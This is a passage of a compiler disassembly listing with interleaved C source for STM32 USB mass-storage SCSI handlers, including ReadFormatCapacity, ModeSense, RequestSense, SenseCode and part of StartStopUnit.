 8009f22:	69bb      	ldr	r3, [r7, #24]
 8009f24:	60da      	str	r2, [r3, #12]

  return 0;
 8009f26:	2300      	movs	r3, #0
}
 8009f28:	4618      	mov	r0, r3
 8009f2a:	3724      	adds	r7, #36	; 0x24
 8009f2c:	46bd      	mov	sp, r7
 8009f2e:	bd90      	pop	{r4, r7, pc}

08009f30 <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f30:	b580      	push	{r7, lr}
 8009f32:	b088      	sub	sp, #32
 8009f34:	af00      	add	r7, sp, #0
 8009f36:	60f8      	str	r0, [r7, #12]
 8009f38:	460b      	mov	r3, r1
 8009f3a:	607a      	str	r2, [r7, #4]
 8009f3c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f3e:	68fb      	ldr	r3, [r7, #12]
 8009f40:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f44:	68fb      	ldr	r3, [r7, #12]
 8009f46:	32b0      	adds	r2, #176	; 0xb0
 8009f48:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f4c:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009f4e:	69bb      	ldr	r3, [r7, #24]
 8009f50:	2b00      	cmp	r3, #0
 8009f52:	d102      	bne.n	8009f5a <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 8009f54:	f04f 33ff 	mov.w	r3, #4294967295
 8009f58:	e063      	b.n	800a022 <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 8009f5a:	68fb      	ldr	r3, [r7, #12]
 8009f5c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009f60:	68fa      	ldr	r2, [r7, #12]
 8009f62:	33b0      	adds	r3, #176	; 0xb0
 8009f64:	009b      	lsls	r3, r3, #2
 8009f66:	4413      	add	r3, r2
 8009f68:	685b      	ldr	r3, [r3, #4]
 8009f6a:	685b      	ldr	r3, [r3, #4]
 8009f6c:	f107 0214 	add.w	r2, r7, #20
 8009f70:	f107 0110 	add.w	r1, r7, #16
 8009f74:	7af8      	ldrb	r0, [r7, #11]
 8009f76:	4798      	blx	r3
 8009f78:	4603      	mov	r3, r0
 8009f7a:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009f7c:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009f80:	2b00      	cmp	r3, #0
 8009f82:	d106      	bne.n	8009f92 <SCSI_ReadFormatCapacity+0x62>
 8009f84:	69bb      	ldr	r3, [r7, #24]
 8009f86:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f8a:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009f8e:	2b02      	cmp	r3, #2
 8009f90:	d108      	bne.n	8009fa4 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009f92:	7af9      	ldrb	r1, [r7, #11]
 8009f94:	233a      	movs	r3, #58	; 0x3a
 8009f96:	2202      	movs	r2, #2
 8009f98:	68f8      	ldr	r0, [r7, #12]
 8009f9a:	f000 f941 	bl	800a220 <SCSI_SenseCode>
    return -1;
 8009f9e:	f04f 33ff 	mov.w	r3, #4294967295
 8009fa2:	e03e      	b.n	800a022 <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 8009fa4:	2300      	movs	r3, #0
 8009fa6:	83fb      	strh	r3, [r7, #30]
 8009fa8:	e007      	b.n	8009fba <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 8009faa:	8bfb      	ldrh	r3, [r7, #30]
 8009fac:	69ba      	ldr	r2, [r7, #24]
 8009fae:	4413      	add	r3, r2
 8009fb0:	2200      	movs	r2, #0
 8009fb2:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 8009fb4:	8bfb      	ldrh	r3, [r7, #30]
 8009fb6:	3301      	adds	r3, #1
 8009fb8:	83fb      	strh	r3, [r7, #30]
 8009fba:	8bfb      	ldrh	r3, [r7, #30]
 8009fbc:	2b0b      	cmp	r3, #11
 8009fbe:	d9f4      	bls.n	8009faa <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 8009fc0:	69bb      	ldr	r3, [r7, #24]
 8009fc2:	2208      	movs	r2, #8
 8009fc4:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 8009fc6:	693b      	ldr	r3, [r7, #16]
 8009fc8:	3b01      	subs	r3, #1
 8009fca:	0e1b      	lsrs	r3, r3, #24
 8009fcc:	b2da      	uxtb	r2, r3
 8009fce:	69bb      	ldr	r3, [r7, #24]
 8009fd0:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 8009fd2:	693b      	ldr	r3, [r7, #16]
 8009fd4:	3b01      	subs	r3, #1
 8009fd6:	0c1b      	lsrs	r3, r3, #16
 8009fd8:	b2da      	uxtb	r2, r3
 8009fda:	69bb      	ldr	r3, [r7, #24]
 8009fdc:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 8009fde:	693b      	ldr	r3, [r7, #16]
 8009fe0:	3b01      	subs	r3, #1
 8009fe2:	0a1b      	lsrs	r3, r3, #8
 8009fe4:	b2da      	uxtb	r2, r3
 8009fe6:	69bb      	ldr	r3, [r7, #24]
 8009fe8:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 8009fea:	693b      	ldr	r3, [r7, #16]
 8009fec:	b2db      	uxtb	r3, r3
 8009fee:	3b01      	subs	r3, #1
 8009ff0:	b2da      	uxtb	r2, r3
 8009ff2:	69bb      	ldr	r3, [r7, #24]
 8009ff4:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 8009ff6:	69bb      	ldr	r3, [r7, #24]
 8009ff8:	2202      	movs	r2, #2
 8009ffa:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 8009ffc:	8abb      	ldrh	r3, [r7, #20]
 8009ffe:	141b      	asrs	r3, r3, #16
 800a000:	b2da      	uxtb	r2, r3
 800a002:	69bb      	ldr	r3, [r7, #24]
 800a004:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a006:	8abb      	ldrh	r3, [r7, #20]
 800a008:	0a1b      	lsrs	r3, r3, #8
 800a00a:	b29b      	uxth	r3, r3
 800a00c:	b2da      	uxtb	r2, r3
 800a00e:	69bb      	ldr	r3, [r7, #24]
 800a010:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a012:	8abb      	ldrh	r3, [r7, #20]
 800a014:	b2da      	uxtb	r2, r3
 800a016:	69bb      	ldr	r3, [r7, #24]
 800a018:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a01a:	69bb      	ldr	r3, [r7, #24]
 800a01c:	220c      	movs	r2, #12
 800a01e:	60da      	str	r2, [r3, #12]

  return 0;
 800a020:	2300      	movs	r3, #0
}
 800a022:	4618      	mov	r0, r3
 800a024:	3720      	adds	r7, #32
 800a026:	46bd      	mov	sp, r7
 800a028:	bd80      	pop	{r7, pc}
	...

0800a02c <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a02c:	b580      	push	{r7, lr}
 800a02e:	b086      	sub	sp, #24
 800a030:	af00      	add	r7, sp, #0
 800a032:	60f8      	str	r0, [r7, #12]
 800a034:	460b      	mov	r3, r1
 800a036:	607a      	str	r2, [r7, #4]
 800a038:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a03a:	68fb      	ldr	r3, [r7, #12]
 800a03c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a040:	68fb      	ldr	r3, [r7, #12]
 800a042:	32b0      	adds	r2, #176	; 0xb0
 800a044:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a048:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a04a:	2317      	movs	r3, #23
 800a04c:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a04e:	693b      	ldr	r3, [r7, #16]
 800a050:	2b00      	cmp	r3, #0
 800a052:	d102      	bne.n	800a05a <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a054:	f04f 33ff 	mov.w	r3, #4294967295
 800a058:	e011      	b.n	800a07e <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a05a:	687b      	ldr	r3, [r7, #4]
 800a05c:	3304      	adds	r3, #4
 800a05e:	781b      	ldrb	r3, [r3, #0]
 800a060:	b29b      	uxth	r3, r3
 800a062:	8afa      	ldrh	r2, [r7, #22]
 800a064:	429a      	cmp	r2, r3
 800a066:	d303      	bcc.n	800a070 <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a068:	687b      	ldr	r3, [r7, #4]
 800a06a:	3304      	adds	r3, #4
 800a06c:	781b      	ldrb	r3, [r3, #0]
 800a06e:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a070:	8afb      	ldrh	r3, [r7, #22]
 800a072:	461a      	mov	r2, r3
 800a074:	4904      	ldr	r1, [pc, #16]	; (800a088 <SCSI_ModeSense6+0x5c>)
 800a076:	6938      	ldr	r0, [r7, #16]
 800a078:	f000 feb8 	bl	800adec <SCSI_UpdateBotData>

  return 0;
 800a07c:	2300      	movs	r3, #0
}
 800a07e:	4618      	mov	r0, r3
 800a080:	3718      	adds	r7, #24
 800a082:	46bd      	mov	sp, r7
 800a084:	bd80      	pop	{r7, pc}
 800a086:	bf00      	nop
 800a088:	2000011c 	.word	0x2000011c

0800a08c <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a08c:	b580      	push	{r7, lr}
 800a08e:	b086      	sub	sp, #24
 800a090:	af00      	add	r7, sp, #0
 800a092:	60f8      	str	r0, [r7, #12]
 800a094:	460b      	mov	r3, r1
 800a096:	607a      	str	r2, [r7, #4]
 800a098:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a09a:	68fb      	ldr	r3, [r7, #12]
 800a09c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a0a0:	68fb      	ldr	r3, [r7, #12]
 800a0a2:	32b0      	adds	r2, #176	; 0xb0
 800a0a4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a0a8:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a0aa:	231b      	movs	r3, #27
 800a0ac:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a0ae:	693b      	ldr	r3, [r7, #16]
 800a0b0:	2b00      	cmp	r3, #0
 800a0b2:	d102      	bne.n	800a0ba <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a0b4:	f04f 33ff 	mov.w	r3, #4294967295
 800a0b8:	e011      	b.n	800a0de <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a0ba:	687b      	ldr	r3, [r7, #4]
 800a0bc:	3308      	adds	r3, #8
 800a0be:	781b      	ldrb	r3, [r3, #0]
 800a0c0:	b29b      	uxth	r3, r3
 800a0c2:	8afa      	ldrh	r2, [r7, #22]
 800a0c4:	429a      	cmp	r2, r3
 800a0c6:	d303      	bcc.n	800a0d0 <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a0c8:	687b      	ldr	r3, [r7, #4]
 800a0ca:	3308      	adds	r3, #8
 800a0cc:	781b      	ldrb	r3, [r3, #0]
 800a0ce:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a0d0:	8afb      	ldrh	r3, [r7, #22]
 800a0d2:	461a      	mov	r2, r3
 800a0d4:	4904      	ldr	r1, [pc, #16]	; (800a0e8 <SCSI_ModeSense10+0x5c>)
 800a0d6:	6938      	ldr	r0, [r7, #16]
 800a0d8:	f000 fe88 	bl	800adec <SCSI_UpdateBotData>

  return 0;
 800a0dc:	2300      	movs	r3, #0
}
 800a0de:	4618      	mov	r0, r3
 800a0e0:	3718      	adds	r7, #24
 800a0e2:	46bd      	mov	sp, r7
 800a0e4:	bd80      	pop	{r7, pc}
 800a0e6:	bf00      	nop
 800a0e8:	20000134 	.word	0x20000134

0800a0ec <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a0ec:	b580      	push	{r7, lr}
 800a0ee:	b086      	sub	sp, #24
 800a0f0:	af00      	add	r7, sp, #0
 800a0f2:	60f8      	str	r0, [r7, #12]
 800a0f4:	460b      	mov	r3, r1
 800a0f6:	607a      	str	r2, [r7, #4]
 800a0f8:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a0fa:	68fb      	ldr	r3, [r7, #12]
 800a0fc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a100:	68fb      	ldr	r3, [r7, #12]
 800a102:	32b0      	adds	r2, #176	; 0xb0
 800a104:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a108:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a10a:	693b      	ldr	r3, [r7, #16]
 800a10c:	2b00      	cmp	r3, #0
 800a10e:	d102      	bne.n	800a116 <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a110:	f04f 33ff 	mov.w	r3, #4294967295
 800a114:	e080      	b.n	800a218 <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a116:	693b      	ldr	r3, [r7, #16]
 800a118:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a11c:	699b      	ldr	r3, [r3, #24]
 800a11e:	2b00      	cmp	r3, #0
 800a120:	d10b      	bne.n	800a13a <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a122:	693b      	ldr	r3, [r7, #16]
 800a124:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a128:	7f59      	ldrb	r1, [r3, #29]
 800a12a:	2320      	movs	r3, #32
 800a12c:	2205      	movs	r2, #5
 800a12e:	68f8      	ldr	r0, [r7, #12]
 800a130:	f000 f876 	bl	800a220 <SCSI_SenseCode>
    return -1;
 800a134:	f04f 33ff 	mov.w	r3, #4294967295
 800a138:	e06e      	b.n	800a218 <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a13a:	2300      	movs	r3, #0
 800a13c:	75fb      	strb	r3, [r7, #23]
 800a13e:	e007      	b.n	800a150 <SCSI_RequestSense+0x64>
  {
    hmsc->bot_data[i] = 0U;
 800a140:	7dfb      	ldrb	r3, [r7, #23]
 800a142:	693a      	ldr	r2, [r7, #16]
 800a144:	4413      	add	r3, r2
 800a146:	2200      	movs	r2, #0
 800a148:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a14a:	7dfb      	ldrb	r3, [r7, #23]
 800a14c:	3301      	adds	r3, #1
 800a14e:	75fb      	strb	r3, [r7, #23]
 800a150:	7dfb      	ldrb	r3, [r7, #23]
 800a152:	2b11      	cmp	r3, #17
 800a154:	d9f4      	bls.n	800a140 <SCSI_RequestSense+0x54>
  }

  hmsc->bot_data[0] = 0x70U;
 800a156:	693b      	ldr	r3, [r7, #16]
 800a158:	2270      	movs	r2, #112	; 0x70
 800a15a:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[7] = REQUEST_SENSE_DATA_LEN - 6U;
 800a15c:	693b      	ldr	r3, [r7, #16]
 800a15e:	220c      	movs	r2, #12
 800a160:	75da      	strb	r2, [r3, #23]

  if ((hmsc->scsi_sense_head != hmsc->scsi_sense_tail))
 800a162:	693b      	ldr	r3, [r7, #16]
 800a164:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a168:	f893 2060 	ldrb.w	r2, [r3, #96]	; 0x60
 800a16c:	693b      	ldr	r3, [r7, #16]
 800a16e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a172:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a176:	429a      	cmp	r2, r3
 800a178:	d03f      	beq.n	800a1fa <SCSI_RequestSense+0x10e>
  {
    hmsc->bot_data[2] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].Skey;
 800a17a:	693b      	ldr	r3, [r7, #16]
 800a17c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a180:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a184:	461a      	mov	r2, r3
 800a186:	693b      	ldr	r3, [r7, #16]
 800a188:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a18c:	f813 2032 	ldrb.w	r2, [r3, r2, lsl #3]
 800a190:	693b      	ldr	r3, [r7, #16]
 800a192:	749a      	strb	r2, [r3, #18]
    hmsc->bot_data[12] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASC;
 800a194:	693b      	ldr	r3, [r7, #16]
 800a196:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a19a:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a19e:	693a      	ldr	r2, [r7, #16]
 800a1a0:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1a4:	00db      	lsls	r3, r3, #3
 800a1a6:	4413      	add	r3, r2
 800a1a8:	791a      	ldrb	r2, [r3, #4]
 800a1aa:	693b      	ldr	r3, [r7, #16]
 800a1ac:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a1ae:	693b      	ldr	r3, [r7, #16]
 800a1b0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1b4:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1b8:	693a      	ldr	r2, [r7, #16]
 800a1ba:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a1be:	00db      	lsls	r3, r3, #3
 800a1c0:	4413      	add	r3, r2
 800a1c2:	795a      	ldrb	r2, [r3, #5]
 800a1c4:	693b      	ldr	r3, [r7, #16]
 800a1c6:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a1c8:	693b      	ldr	r3, [r7, #16]
 800a1ca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1ce:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1d2:	3301      	adds	r3, #1
 800a1d4:	b2da      	uxtb	r2, r3
 800a1d6:	693b      	ldr	r3, [r7, #16]
 800a1d8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1dc:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a1e0:	693b      	ldr	r3, [r7, #16]
 800a1e2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1e6:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a1ea:	2b04      	cmp	r3, #4
 800a1ec:	d105      	bne.n	800a1fa <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a1ee:	693b      	ldr	r3, [r7, #16]
 800a1f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1f4:	2200      	movs	r2, #0
 800a1f6:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a1fa:	693b      	ldr	r3, [r7, #16]
 800a1fc:	2212      	movs	r2, #18
 800a1fe:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a200:	687b      	ldr	r3, [r7, #4]
 800a202:	3304      	adds	r3, #4
 800a204:	781b      	ldrb	r3, [r3, #0]
 800a206:	2b12      	cmp	r3, #18
 800a208:	d805      	bhi.n	800a216 <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a20a:	687b      	ldr	r3, [r7, #4]
 800a20c:	3304      	adds	r3, #4
 800a20e:	781b      	ldrb	r3, [r3, #0]
 800a210:	461a      	mov	r2, r3
 800a212:	693b      	ldr	r3, [r7, #16]
 800a214:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a216:	2300      	movs	r3, #0
}
 800a218:	4618      	mov	r0, r3
 800a21a:	3718      	adds	r7, #24
 800a21c:	46bd      	mov	sp, r7
 800a21e:	bd80      	pop	{r7, pc}

0800a220 <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a220:	b480      	push	{r7}
 800a222:	b085      	sub	sp, #20
 800a224:	af00      	add	r7, sp, #0
 800a226:	6078      	str	r0, [r7, #4]
 800a228:	4608      	mov	r0, r1
 800a22a:	4611      	mov	r1, r2
 800a22c:	461a      	mov	r2, r3
 800a22e:	4603      	mov	r3, r0
 800a230:	70fb      	strb	r3, [r7, #3]
 800a232:	460b      	mov	r3, r1
 800a234:	70bb      	strb	r3, [r7, #2]
 800a236:	4613      	mov	r3, r2
 800a238:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a23a:	687b      	ldr	r3, [r7, #4]
 800a23c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a240:	687b      	ldr	r3, [r7, #4]
 800a242:	32b0      	adds	r2, #176	; 0xb0
 800a244:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a248:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a24a:	68fb      	ldr	r3, [r7, #12]
 800a24c:	2b00      	cmp	r3, #0
 800a24e:	d03d      	beq.n	800a2cc <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a250:	68fb      	ldr	r3, [r7, #12]
 800a252:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a256:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a25a:	461a      	mov	r2, r3
 800a25c:	68fb      	ldr	r3, [r7, #12]
 800a25e:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a262:	78b9      	ldrb	r1, [r7, #2]
 800a264:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a268:	68fb      	ldr	r3, [r7, #12]
 800a26a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a26e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a272:	68fa      	ldr	r2, [r7, #12]
 800a274:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a278:	00db      	lsls	r3, r3, #3
 800a27a:	4413      	add	r3, r2
 800a27c:	787a      	ldrb	r2, [r7, #1]
 800a27e:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a280:	68fb      	ldr	r3, [r7, #12]
 800a282:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a286:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a28a:	68fa      	ldr	r2, [r7, #12]
 800a28c:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a290:	00db      	lsls	r3, r3, #3
 800a292:	4413      	add	r3, r2
 800a294:	2200      	movs	r2, #0
 800a296:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a298:	68fb      	ldr	r3, [r7, #12]
 800a29a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a29e:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2a2:	3301      	adds	r3, #1
 800a2a4:	b2da      	uxtb	r2, r3
 800a2a6:	68fb      	ldr	r3, [r7, #12]
 800a2a8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2ac:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a2b0:	68fb      	ldr	r3, [r7, #12]
 800a2b2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2b6:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a2ba:	2b04      	cmp	r3, #4
 800a2bc:	d107      	bne.n	800a2ce <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a2be:	68fb      	ldr	r3, [r7, #12]
 800a2c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a2c4:	2200      	movs	r2, #0
 800a2c6:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a2ca:	e000      	b.n	800a2ce <SCSI_SenseCode+0xae>
    return;
 800a2cc:	bf00      	nop
  }
}
 800a2ce:	3714      	adds	r7, #20
 800a2d0:	46bd      	mov	sp, r7
 800a2d2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a2d6:	4770      	bx	lr

0800a2d8 <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2d8:	b580      	push	{r7, lr}
 800a2da:	b086      	sub	sp, #24
 800a2dc:	af00      	add	r7, sp, #0
 800a2de:	60f8      	str	r0, [r7, #12]
 800a2e0:	460b      	mov	r3, r1
 800a2e2:	607a      	str	r2, [r7, #4]
 800a2e4:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2e6:	68fb      	ldr	r3, [r7, #12]
 800a2e8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2ec:	68fb      	ldr	r3, [r7, #12]
 800a2ee:	32b0      	adds	r2, #176	; 0xb0
 800a2f0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2f4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a2f6:	697b      	ldr	r3, [r7, #20]
 800a2f8:	2b00      	cmp	r3, #0
 800a2fa:	d102      	bne.n	800a302 <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a2fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a300:	e043      	b.n	800a38a <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a302:	697b      	ldr	r3, [r7, #20]
 800a304:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a308:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a30c:	2b01      	cmp	r3, #1
 800a30e:	d10f      	bne.n	800a330 <SCSI_StartStopUnit+0x58>
 800a310:	687b      	ldr	r3, [r7, #4]
 800a312:	3304      	adds	r3, #4
 800a314:	781b      	ldrb	r3, [r3, #0]
 800a316:	f003 0303 	and.w	r3, r3, #3
 800a31a:	2b02      	cmp	r3, #2
 800a31c:	d108      	bne.n	800a330 <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a31e:	7af9      	ldrb	r1, [r7, #11]
 800a320:	2324      	movs	r3, #36	; 0x24
 800a322:	2205      	movs	r2, #5
 800a324:	68f8      	ldr	r0, [r7, #12]
 800a326:	f7ff ff7b 	bl	800a220 <SCSI_SenseCode>

    return -1;
 800a32a:	f04f 33ff 	mov.w	r3, #4294967295
 800a32e:	e02c      	b.n	800a38a <SCSI_StartStopUnit+0xb2>
  }

